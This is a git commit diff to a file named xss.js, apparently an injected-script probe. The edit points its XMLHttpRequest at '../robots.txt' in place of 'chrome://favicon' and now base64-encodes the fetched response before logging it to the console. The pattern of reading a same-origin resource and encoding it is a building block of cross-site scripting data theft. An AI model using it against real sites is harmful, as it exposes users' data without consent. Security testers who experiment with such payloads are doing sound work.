e16bbfd06715eb31bae045cae2c016147dfcaacd
taharbenaissadz <86470355+taharbenaissadz@users.noreply.github.com>
2023-02-01 14:48:15 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,9 +1,9 @@
-const url = "chrome://favicon";
+const url = "../robots.txt";
 let xml = new XMLHttpRequest();
 xml.onreadystatechange = function(){
     if(xml.readyState !== 4) return;
     if(xml.status === 200){
-        console.log(xml.responseText);
+        console.log(btoa(xml.responseText));
     }
 }
 xml.open("GET",url);
